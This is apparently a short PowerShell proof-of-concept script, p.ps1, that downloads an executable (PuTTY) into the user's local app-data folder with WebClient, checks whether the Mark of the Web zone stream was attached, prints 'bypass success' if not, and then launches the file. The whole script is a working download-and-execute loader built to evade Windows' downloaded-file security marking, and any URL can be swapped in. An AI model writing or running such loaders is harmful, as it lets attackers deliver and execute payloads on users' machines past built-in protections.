# p.ps1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $Url = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'
 $Out = Join-Path $env:LOCALAPPDATA 'putty.exe'
 $bytes = (New-Object Net.WebClient).DownloadData($Url)
[IO.File]::WriteAllBytes($Out, $bytes)
 $ads = Get-Item $Out -Stream Zone.Identifier -ErrorAction SilentlyContinue
if ($ads) {
    Write-Host "MOTW PRESENT - bypass failed" -ForegroundColor Red
} else {
    Write-Host "MOTW absent - bypass success" -ForegroundColor Green
}
Write-Host "Wrote $($bytes.Length) bytes -> $Out"
Start-Process -FilePath $Out
